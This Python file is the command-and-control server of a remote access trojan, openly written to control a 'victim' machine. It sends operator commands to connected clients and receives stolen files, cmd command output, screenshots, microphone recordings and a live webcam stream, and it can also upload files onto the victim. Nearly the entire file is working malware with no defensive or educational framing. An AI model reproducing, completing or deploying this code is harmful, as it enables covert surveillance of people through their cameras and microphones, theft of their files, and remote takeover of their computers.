import socket
import threading
import cv2
import numpy as np


class Server:
    port = None
    ip = None
    listen_count = None
    client_name = ''

    def __init__(self, port, ip, listen_count, client_name):
        self.port = port
        self.ip = ip
        self.listen_count = listen_count
        self.client_name = client_name

    def startListen(self):
        self.s = socket.socket()
        self.s.bind((self.ip, self.port))
        self.s.listen(self.listen_count)
        self.server_socket, self.adress = self.s.accept()

    def runThread(self):
        self.startListen()
        self.server()

    def receive_file_from_client(self, auto_saving):
        if auto_saving:
            file_path = "C:\\C projects\\CMD_Text.txt"

        else:
            # Take from the victim file
            file_path = input("Where do you want save the file?\n")

        with open(file_path, 'wb')as f:
            print('Open File')
            while True:
                data = self.server_socket.recv(1024)
                if not data or len(data) < 1024:
                    if data:
                        f.write(data)
                    f.flush()
                    f.close()
                    break
                f.write(data)

    def send_file_to_client(self, data):
        # Send to the victim files
        victim_path = input('Where do you want save the file\n')
        self.server_socket.sendall(victim_path.encode('utf-8'))
        f = open(data, 'rb')
        while True:
            content = f.read(1024)
            if content:
                self.server_socket.sendall(content)
            else:
                f.close()
                break

    def capture_camera(self):

        # Receiving 5 every time because its the length of the encoded image
        data_size = self.server_socket.recv(5).decode()

        # If the camera of the client isn't connected
        if data_size.startswith("$$$$$"):
            print("The camera of the client is not connected")
            return

        while True:
            print(data_size)
            if data_size.startswith("#####"):
                print("Got exception on the client")
                cv2.destroyWindow(self.client_name + "camera")
                return

            data = self.server_socket.recv(int(data_size))

            data = np.asarray(bytearray(data), dtype="uint8")
            image = cv2.imdecode(data, cv2.IMREAD_COLOR)

            cv2.imshow(self.client_name + "camera", image)
            cv2.waitKey(1)
            data_size = self.server_socket.recv(5).decode()

        cv2.destroyWindow(self.client_name + "camera")

    def server(self):
        print("Connection from: " + str(self.adress))

        while True:
            print("test")
            command = input('Please enter a command to the victim\n')
            self.server_socket.send(command.encode('utf-8'))

            if command.startswith('get file '):
                self.receive_file_from_client(False)


            elif command.startswith("cmd"):
                self.receive_file_from_client(True)
                file_content = ''
                with open("C:\\C projects\\CMD_Text.txt") as file:
                    for line in file.readlines():
                        file_content += line
                print(file_content)



            elif command.startswith('download file '):
                command = command[14:-1] + command[-1]
                self.send_file_to_client(command)


            elif command.startswith('take record '):
                command = command[12:-1] + command[-1]
                self.server_socket.sendall(command.encode('utf-8'))
                path = input("Where do you want save the file on victim computer\n")
                self.server_socket.sendall(path.encode('utf-8'))
                self.receive_file_from_client(False)

            elif command.startswith('take screenshot '):
                self.receive_file_from_client(False)


            elif command == 'exit':
                break

            elif command.startswith('listen'):
                self.receive_file_from_client(False)

            elif command.startswith('take mic output'):
                self.receive_file_from_client(False)

            elif command.startswith("take camera video"):
                self.capture_camera()
                continue

            elif command == 'exit':
                self.server_socket.close()
                break

            else:
                data = self.server_socket.recv(1024).decode('utf-8')
                print(data)

        self.server_socket.close()


myServer = Server(7613, '127.0.0.1', 1, 'client1')
myServer2 = Server(9999, '127.0.0.1', 1, 'client2')

t1 = threading.Thread(target=myServer.runThread, args=())
t2 = threading.Thread(target=myServer2.runThread, args=())

t1.start()
t2.start()

t1.join()
t2.join()
